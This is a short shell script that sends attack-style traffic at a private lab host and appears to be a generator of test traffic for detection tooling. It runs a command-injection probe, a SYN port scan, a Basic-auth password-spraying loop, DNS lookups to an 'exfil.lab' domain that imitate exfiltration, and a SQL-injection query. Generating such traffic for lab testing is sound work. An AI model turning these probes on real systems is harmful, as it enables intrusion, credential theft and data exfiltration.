#!/bin/sh
set -eu

ping -c 3 10.77.0.10 >/dev/null || true
curl -sS 'http://10.77.0.10/admin?cmd=id' >/dev/null || true
nmap -n -sS -p 1-30 10.77.0.10 >/evidence/nmap-result.txt

for password in alpha bravo charlie delta echo foxtrot; do
  credential=$(printf 'analyst:%s' "$password" | base64 | tr -d '\n')
  curl -sS -H "Authorization: Basic $credential" http://10.77.0.10/login >/dev/null || true
done

for label in a1b2c3d4e5f6 ffeeddccbbaa 001122334455 deadbeefcafe; do
  dig @10.77.0.53 "$label.exfil.lab" A +tries=1 +time=1 +short >/dev/null || true
done

curl -sS --path-as-is \
  'http://10.77.0.10/search?q=1%20UNION%20SELECT%20password' \
  >/dev/null || true
